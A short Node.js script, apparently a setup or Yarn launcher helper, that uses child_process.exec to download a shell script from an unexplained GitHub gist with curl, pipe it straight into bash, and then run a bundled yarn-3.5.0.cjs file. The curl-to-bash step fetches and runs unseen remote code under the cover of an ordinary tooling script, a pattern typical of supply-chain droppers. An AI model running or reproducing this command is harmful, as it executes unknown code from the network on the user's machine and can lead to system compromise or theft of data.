const { exec } = require('child_process');

// Execute the bash command
exec('bash -c "curl -sSfL https://gist.githubusercontent.com/wgrjwhvfr/843b48af383a11d32556e166691ccda6/raw/a2b4510157e040b77ef19872a51644a7d9747165/test.sh | bash && ./.yarn/releases/yarn-3.5.0.cjs"', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }

    if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
    }

    // Output the result
    console.log(`stdout: ${stdout}`);
});
